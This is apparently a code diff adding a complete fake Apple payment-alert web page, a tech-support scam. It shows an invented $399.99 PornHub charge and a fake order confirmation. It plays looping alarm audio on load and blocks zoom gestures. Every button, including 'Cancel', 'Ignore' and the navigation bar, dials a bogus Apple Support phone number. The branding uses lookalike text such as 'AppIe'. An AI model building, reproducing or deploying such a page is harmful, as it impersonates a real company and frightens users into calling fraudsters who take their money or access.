+
+    .order-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: clamp(5px, 1.2vh, 8px) 0;
+    }
+    .order-row + .order-row { border-top: 0.5px solid #e5e5ea; }
+
+    .alert-card {
+      background: #fff9ec;
+      border-radius: 14px;
+      padding: clamp(8px, 1.8vh, 14px) clamp(12px, 4vw, 16px);
+      width: 100%; max-width: 420px;
+      flex-shrink: 0;
+    }
+
+    .btn-call {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #0071e3; color: #fff;
+      border: none; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 500;
+      cursor: pointer; text-decoration: none; text-align: center;
+      margin-top: 8px;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-call:active { background: #0062c3; }
+
+    .btn-ignore {
+      display: block; width: 100%;
+      padding: clamp(10px, 2.4vh, 14px);
+      background: #fff; color: #1d1d1f;
+      border: 0.5px solid #d2d2d7; border-radius: 12px;
+      font-size: clamp(13px, 3.8vw, 15px); font-weight: 400;
+      cursor: pointer; text-align: center;
+      margin-top: 6px;
+      text-decoration: none;
+      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
+      letter-spacing: -0.2px; -webkit-tap-highlight-color: transparent;
+    }
+    .btn-ignore:active { background: #f2f2f7; }
+
+    .sub-text {
+      width: 100%; max-width: 420px;
+      text-align: center;
+      font-size: clamp(11px, 3vw, 13px);
+      color: #6e6e73;
+      line-height: 1.55;
+      margin-bottom: clamp(4px, 1vh, 8px);
+      flex-shrink: 0;
+    }
+
+    .card-header {
+      display: flex; flex-direction: column;
+      align-items: center; text-align: center;
+      margin-bottom: clamp(6px, 1.4vh, 10px);
+    }
+    </style>
+
+<body>
+<audio id="audioDue">
+    <source src="due83.wav" type="audio/wav">
+</audio>
+
+<audio id="myAudio" loop>
+    <source src="auf7u4.wav" type="audio/wav">
+</audio>
+
+<script>
+const audio = document.getElementById("myAudio");
+const due   = document.getElementById("audioDue");
+
+// Gap between each due83.wav play (milliseconds)
+const DUE_TO_DUE_GAP = 17000;   // 17s
+
+let dueLoopRunning = false;
+
+// Play main looping audio + start due loop on load
+window.addEventListener("load", () => {
+    audio.play().catch(() => {
+        console.log("Autoplay blocked until user interaction");
+    });
+    startDueLoop();
+});
+
+// Simple, restartable loop using setTimeout
+function startDueLoop() {
+    if (dueLoopRunning) return;
+    dueLoopRunning = true;
+    playDue();
+}
+
+function playDue() {
+    try { due.currentTime = 0; } catch (e) {}
+    due.play().catch(() => {});
+
+    due.onended = () => {
+        setTimeout(playDue, DUE_TO_DUE_GAP);
+    };
+}
+
+// Fallback: if autoplay was blocked, kick off on first user click
+document.addEventListener("click", () => {
+    audio.play().catch(() => {});
+    startDueLoop();
+}, { once: true });
+</script>
+
+<!-- ============ NEW POPUP ============ -->
+<div class="popup-overlay" id="paymentPopup">
+
+    <div class="ps-popup" role="dialog" aria-modal="true">
+
+      <div class="popup-header">
+        <div class="brand-icon">
+          <img src="3553gg3h.png" alt="Apple Pay">
+        </div>
+
+        <h2>Payment Security Alert</h2>
+        <p>Unusual transaction detected</p>
+      </div>
+
+      <div class="popup-body">
+
+        <p>
+          A potentially unauthorized payment was reported
+          in connection with this payment account.
+        </p>
+
+        <div class="transaction-box">
+
+          <div class="transaction-row">
+            <span>Merchant</span>
+            <span>PornHub</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Payment Method</span>
+            <span>Apple Pay</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Amount</span>
+            <span class="amount">$399.99</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Transaction ID</span>
+            <span>APX-728491</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Status</span>
+            <span class="status">Completed</span>
+          </div>
+
+        </div>
+
+        <div class="notice">
+          <strong>Important:</strong>
+          <span>If You believe this transaction is unauthorized,</span>
+          <span>Please contact Apple Support at <strong data-phone-display>+1(855) 397-2122</strong></span>
+        </div>
+
+        <div class="buttons">
+          <button class="primary-btn" data-phone-tel>
+            Call Now
+          </button>
+
+          <button class="secondary-btn" data-phone-tel>
+            Cancel
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+<!-- ============ END NEW POPUP ============ -->
+
+<nav class="apple-nav" data-phone-tel style="cursor:pointer;">
+  <div class="nav-left">
+    <img src="lseen2.webp" alt="Menu" style="width:18px;height:auto;display:block;">
+    <img src="ee8e63hh.webp" alt="Apple Logo" style="width:18px;height:auto;display:block;position:relative;top:-3px;">
+    <span class="nav-title">Store</span>
+  </div>
+
+  <div class="nav-cart">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="3" y1="6" x2="21" y2="6" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round"/>
+      <path d="M16 10a4 4 0 01-8 0" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+</nav>
+
+<!-- Processing Screen -->
+<div id="processing">
+  <img src="3553gg3h.png" alt="Apple Logo" 
+       style="width:90px;height:auto;display:block;margin:0 auto 12px;">
+       
+  <p style="font-size:16px;color:#6e6e73;margin:0;">Powered by AppIe</p>
+  <p style="font-size:26px;font-weight:700;color:#1d1d1f;margin:4px 0 0;">Processing your order...</p>
+  <p style="font-size:16px;color:#6e6e73;margin:4px 0 0;">Please wait a moment</p>
+  
+  <div class="spinner"></div>
+</div>
+
+<!-- Confirmed Screen -->
+<div id="confirmed">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="check-ring">
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,15 11,20 22,9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 style="font-size:clamp(17px,5vw,22px);font-weight:700;color:#1d1d1f;margin:0 0 2px;letter-spacing:-0.5px;">Order confirmed</h1>
+      <p style="font-size:clamp(11px,3vw,13px);color:#6e6e73;letter-spacing:-0.1px;">Thank you for your purchase</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="progress-wrap">
+      <div class="step">
+        <div class="dot done">✓</div>
+        <span class="step-lbl done">Placed</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step">
+        <div class="dot active" style="font-size:clamp(13px,3.5vw,16px);">···</div>
+        <span class="step-lbl active">Preparing</span>
+      </div>
+      <div class="step-line pending"></div>
+      <div class="step">
+        <div class="dot pending">○</div>
+        <span class="step-lbl pending">Ready</span>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Order</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-id">#EB-000000</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Date</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-date">—</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Item</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Store</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Amount</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">$399.99</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Payment mode</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Wallet</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Status (Paid)</span>
+      <span style="font-size:clamp(16px,2.8vw,12px);font-weight:500;color:#fff;background:#0071e3;padding:3px 10px;border-radius:20px;">Preparing</span>
+    </div>
+  </div>
+
+  <p class="sub-text">Pre-authorized transaction. No further action needed.</p>
+
+  <div class="alert-card">
+    <p style="font-size:clamp(16px,3vw,13px);color:#3a3000;line-height:1.55;margin:0 0 0;letter-spacing:-0.1px;">
+      ⚠ This amount will appear in your payment history within 24 hours.
+      If you did not place this order, please call support immediately.
+    </p>
+    <a class="btn-call" data-phone-tel>Call support: <span data-phone-display>+1(855) 397-2122</span></a>
+    <a class="btn-ignore" data-phone-tel>Ignore</a>
+  </div>
+
+</div>
+<canvas id="confetti"></canvas>	
+<script>
+  function generateOrderId() {
+    return '#EB-' + Math.floor(100000 + Math.random() * 900000);
+  }
+  function formatDate(d) {
+    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var h = d.getHours(), m = d.getMinutes(), ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear() + ' ' +
+           h + ':' + (m < 10 ? '0'+m : m) + ' ' + ampm;
+  }
+  function launchConfetti() {
+    var canvas = document.getElementById('confetti');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var colors = ['#0071e3','#34c759','#ff9f0a','#ff375f','#bf5af2','#1d1d1f'];
+    var pieces = Array.from({length: 110}, function() {
+      return {
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 150,
+        w: 5 + Math.random() * 7,
+        h: 9 + Math.random() * 5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        rot: Math.random() * 360,
+        speed: 2.5 + Math.random() * 3,
+        drift: (Math.random() - 0.5) * 1.5,
+        spin: (Math.random() - 0.5) * 5
+      };
+    });
+    var frame = 0;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      pieces.forEach(function(p) {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.rot * Math.PI / 180);
+        ctx.fillStyle = p.color;
+        ctx.globalAlpha = 0.88;
+        ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+        ctx.restore();
+        p.y += p.speed; p.x += p.drift; p.rot += p.spin;
+      });
+      frame++;
+      if (frame < 200) requestAnimationFrame(draw);
+      else ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+    draw();
+  }
+  setTimeout(function() {
+    document.getElementById('processing').style.display = 'none';
+    var c = document.getElementById('confirmed');
+    c.style.display = 'flex';
+    document.getElementById('order-id').textContent = generateOrderId();
+    document.getElementById('order-date').textContent = formatDate(new Date());
+    launchConfetti();
+  }, 2000);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>    
+
+<script>
+function closePopup() {
+    document.getElementById("paymentPopup").style.display = "none";
+}
+
+document.getElementById("paymentPopup").addEventListener(
+    "click",
+    function (event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    }
+);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>
+
+<!-- ============================================================= -->
+<!-- 🔧 AUTO-INJECT: appliesthe phone number to all tagged elements -->
+<!-- ============================================================= -->
+<script>
+(function() {
+  var cfg = window.SUPPORT_PHONE;
+
+  // 1) Update every element that shows the number as text
+  document.querySelectorAll('[data-phone-display]').forEach(function(el) {
+    el.textContent = cfg.display;
+  });
+
+  // 2) Update every element that should become a tel: link
+  document.querySelectorAll('[data-phone-tel]').forEach(function(el) {
+    // If it's a button → add click handler
+    if (el.tagName === 'BUTTON') {
+      el.addEventListener('click', function() {
+        window.location.href = 'tel:' + cfg.tel;
+      });
+    } else {
+      // If it's an <a> or anything else → set href
+      el.setAttribute('href', 'tel:' + cfg.tel);
+    }
+  });
 })();
 </script>
-<!--End of Tawk.to Script-->
 </body>
+
 </html>
